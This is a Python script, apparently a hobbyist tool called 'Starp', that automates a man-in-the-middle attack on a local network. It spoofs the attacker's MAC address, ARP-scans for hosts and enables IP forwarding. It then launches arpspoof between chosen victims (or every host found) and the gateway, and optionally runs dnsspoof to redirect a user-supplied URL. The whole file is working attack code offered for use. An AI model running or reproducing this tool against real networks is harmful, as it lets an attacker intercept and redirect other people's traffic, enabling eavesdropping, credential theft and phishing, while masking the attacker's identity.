#!/usr/bin/env python3

from os import geteuid
import subprocess
import netifaces
import sys
import time
from prettytable import PrettyTable
from netaddr import IPAddress
from scapy.all import ARP, Ether, srp
import threading
from uuid import uuid4
from django.forms import URLField
from django.core.exceptions import ValidationError

J = False
choice_scan = None
choice_dns = None
choice_mac = None
url = None

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    LG = '\033[0;49;92m'
    GREEN = '\033[0;49;32m'
    YELLOW = '\033[0;49;93m'
    DY = '\033[0;49;33m'
    RED = '\033[0;49;91m'
    DR = '\033[0;49;31m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE  = '\33[37m'

# Get network Interface + Gateway + Netmask
def get_interface():
    global interface
    gateways = netifaces.gateways()
    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
        interface = gateways['default'][netifaces.AF_INET][1]
    else:
        interface = None
    if interface == None:
        sys.exit(color.RED+"[-] No interface connected to a network was detected"+color.END)
    else:
        print(color.GREEN+"[+] Interface: "+color.YELLOW+interface+color.END)

# Change MAC of Interface
def change_mac():
    print(color.BLUE+"[~] Changing MAC address..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    cmd = subprocess.run(['macchanger', '-A' , interface], capture_output=True).stdout.decode()
    for line in cmd.strip().splitlines()[:3]:
        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()

def reset_mac():
    print(color.BLUE+"[~] Restoring MAC address..."+color.END)
    subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
    cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
    for line in cmd.strip().splitlines()[:3]:
        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
    subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
    
def NetworkManager():
    print(color.BLUE+"[~] Restarting NetworkManager..."+color.END)
    subprocess.run(['systemctl', 'start', 'NetworkManager'])
    
def get_gateway():
    global gateway
    gateways = netifaces.gateways()
    if 'default' in gateways and netifaces.AF_INET in gateways['default']:
        gateway = gateways['default'][netifaces.AF_INET][0]
    else:
        gateway = None
    if gateway == None:
        sys.exit(color.RED+"[-] An error has occured during fetching gateway"+color.END)
    else:
        print(color.GREEN+"[+] Gateway: "+color.YELLOW+gateway+color.END)

def get_netmask():
    global netmask, cidr
    ifaddrs = netifaces.ifaddresses(interface)
    if netifaces.AF_INET in ifaddrs:
        netmask = ifaddrs[netifaces.AF_INET][0].get('netmask')
    else:
        netmask = None
    if netmask == None:
        sys.exit(color.RED+"[-] An error has occured during fetching mask"+color.END)
    else:
        print(color.GREEN+"[+] Mask: "+color.YELLOW+netmask+color.END)
        cidr = '/'+str(IPAddress(netmask).netmask_bits())

# Get essid
def get_ssid():
    global essid
    try:
        out = subprocess.check_output(['iwgetid']).decode()
        essid = out.split('"')[1]
        print(color.GREEN+"[+] ESSID: "+color.YELLOW+essid+color.END)
    except:
        print(color.RED+"[-] An error has occured during fetching ESSID"+color.END)
        
def getmac(interface):
    try:
        mac = open('/sys/class/net/'+interface+'/address').readline()
    except:
        mac = "00:00:00:00:00:00"
    return mac[0:17]

def scan_network():
    global ip_dict, all
    ip_dict = {}
    i = 1
    all = False
    net_table = PrettyTable()
    net_table.field_names = ["", "IP", "MAC"]
    
    arp = ARP(pdst=gateway+cidr)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    print(color.BLUE+"[~] Scanning network...\n"+color.END)
    result = srp(packet, timeout=3, verbose=0)[0]

    for s, x in result:
        ip_dict.update({i: [x.psrc, x.hwsrc]})
        net_table.add_row([str(i), str(x.psrc), str(x.hwsrc)])
        i+=1
        
    net_table.align = "l"
    net_table.align["MAC"] = "c"
    print("Available devices in the network:")
    print(net_table)

# Get target IP
def target():
    global choice_ip, all
    if len(ip_dict) > 0:
        print("\n[0] : "+"All"+color.GREEN)
        print("[R] : "+"Rescan Network"+color.PURPLE)
        if getmac(interface) != mac_og:
            print("[M] : "+"Restore MAC Address and Scan Network"+color.RED)
        print("[E] : "+"Exit"+color.CYAN)
        print("\nChoose an IP to spoof, rescan or exit"+color.END)
    else:
        print(color.GREEN+"\n[R] : "+"Rescan Network"+color.PURPLE)
        if getmac(interface) != mac_og:
            print("[M] : "+"Restore MAC Address and Scan Network"+color.RED)
        print("[E] : "+"Exit"+color.CYAN)
        if getmac(interface) != mac_og:
            print("\nIt looks like no hosts were found in the scanning session.\nYou can Rescan the network while maintaining a fake MAC address or restore your real MAC Address and Rescan the network."+color.END)
    choice_ip = ""
    while not set(choice_ip.split(" ")).issubset({str(key) for key in ip_dict.keys()}) and choice_ip != "R" and choice_ip != "E" and choice_ip != "0" and choice_ip != "M":
        choice_ip = input("Choice: ")
    if choice_ip == "E":
        reset_mac()
        sys.exit(color.RED+"Exiting..."+color.END)
    elif choice_ip == "R":
        scan_network()
        target()
    elif choice_ip == "M":
        reset_mac()
        NetworkManager()
        time.sleep(5)
        scan_network()
        target()
    elif choice_ip == "0":
        all = True
    else:
        try:
            ip_dict[int(''.join(choice_ip)[0])]
        except ValueError:
            reset_mac()
            sys.exit(color.RED+"[-] An error has occured\n Exiting..."+color.END)

# Enable Redirect
def redirect(value):
    cmd = 'echo '+str(value)+' | sudo tee /proc/sys/net/ipv4/ip_forward'
    if value == 1:
        print(color.BLUE+"\n[~] Enabling forwarding..."+color.END)
    else:
        print(color.BLUE+"\n[~] Disabling forwarding..."+color.END)
    try:
        subprocess.check_output(cmd, shell=True).decode()
    except subprocess.CalledProcessError:
        print(color.RED+"[-] Couldn't enable or disable forwarding"+color.END)
        reset_mac()
        sys.exit(color.RED+"Exiting..."+color.END)

# ARPSpoof
def arpspoof(ip1,ip2,pos):
    subprocess.Popen(['xterm', '-geometry', '110x24'+str(pos)+'0+0', '-hold', '-e', 'arpspoof', '-t', ip1, ip2, '-i', interface])

# Attack thread
def attck_thread():
    global J, choice_dns
    threads = []
    print(color.BLUE+"[~] Arpspoofing..."+color.END)
    J = True
    if all:
        if len(ip_dict) > 0:
            for w in ip_dict:
                t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[w][0], '+',))
                t2 = threading.Thread(target=arpspoof, args=(ip_dict[w][0], gateway, '-',))
                threads.append(t1)
                threads.append(t2)
            for i in threads:
                i.start()
            for i in threads:
                i.join()
            while choice_dns != "Y" and choice_dns != "N" and choice_dns != "n" and choice_dns != "y":
                choice_dns = input("Start DNS Spoofing? (Y/N): ")
            if choice_dns == "Y" or choice_dns == "y":
                get_url()
                create_file()
                dnsspoof()
                
        else:
            print(color.RED+"[-] No devices available to spoof"+color.END)
            reset_mac()
            sys.exit(color.RED+"Exiting..."+color.END)
    else:
        for i in choice_ip.split():
            t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[int(i)][0], '+',))
            t2 = threading.Thread(target=arpspoof, args=(ip_dict[int(i)][0], gateway, '-',))
            threads.append(t1)
            threads.append(t2)
        for i in threads:
            i.start()
        for i in threads:
            i.join()
        while choice_dns != "Y" and choice_dns != "N" and choice_dns != "n" and choice_dns != "y":
            choice_dns = input("Start DNS Spoofing? (Y/N): ")
        if choice_dns == "Y" or choice_dns == "y":
            get_url()
            create_file()
            print(color.BLUE+"[~] DNSspoofing..."+color.END)
            dnsspoof()

# Get URL
def get_url():
    global url 
    while not url_valid():
        url = input("URL to be cloned: ")

def url_valid():
    global url
    url_form_field = URLField()
    try:
        url_form_field.clean(url)
    except ValidationError:
        return False
    return True
    
# Create DNS file
def create_file():
    global dns_file
    dns_file = '/tmp/dns_file'+str(uuid4())
    print(color.BLUE+"[~] Creating DNS file..."+color.END)
    with open(dns_file, 'w') as file:
        file.write(url+'\tlocalhost\nlocalhost\t'+url+'\n')
    file.close()

# DNSSpoof
def dnsspoof():
    subprocess.run(['xterm', '-geometry', '110x24+0-0', '-hold', '-e', 'dnsspoof', '-f', dns_file, '-i', interface])


banner = '''
{2}  ____  _                   
{2} / ___|| |_ __ _ _ __ _ __  
{2} \___ \| __/ _` | '__| '_ \ 
{3}  ___) | || (_| | |  | |_) |
{3} |____/ \__\__,_|_|  | .__/ 
          {0}by kod34{3}   |_|                
{4}'''.format(color.RED, color.BLUE, color.PURPLE, color.YELLOW, color.END)


if geteuid() != 0:
    sys.exit(color.RED+"Run as root!"+color.END)
try:
    print(banner)
    print(color.BLUE+"[~] Fetching info..."+color.END)
    time.sleep(1)
    get_interface()
    mac_og = getmac(interface)
    print(color.GREEN+"[+] MAC: "+color.YELLOW+mac_og+color.END)
    get_gateway()
    get_netmask()
    get_ssid()
    while choice_mac != "Y" and choice_mac != "N" and choice_mac != "n" and choice_mac != "y":
        choice_mac = input("Change MAC? (Y/N): ")
    if choice_mac == "Y" or choice_mac == "y":
        change_mac()
        time.sleep(5)
    while choice_scan != "Y" and choice_scan != "N" and choice_scan != "n" and choice_scan != "y":
        choice_scan = input("Start Scan? (Y/N): ")
    if choice_scan == "Y" or choice_scan == "y":
        scan_network()
    else:
        reset_mac()
        sys.exit(color.RED+"Exiting..."+color.END)
    target()
    redirect(1)
    attck_thread()
    print(color.GREEN+"\n[+] Job Done...\n"+color.END)
    redirect(0)
    reset_mac()
except KeyboardInterrupt as k:
    if J:
        print(color.GREEN+"\n[+] Job Done...\n"+color.END)
    else:
        print(color.RED+"\n[-] Keyboard Interrupt"+color.END)
    redirect(0)
    reset_mac()
    sys.exit(color.RED+"Exiting..."+color.END)


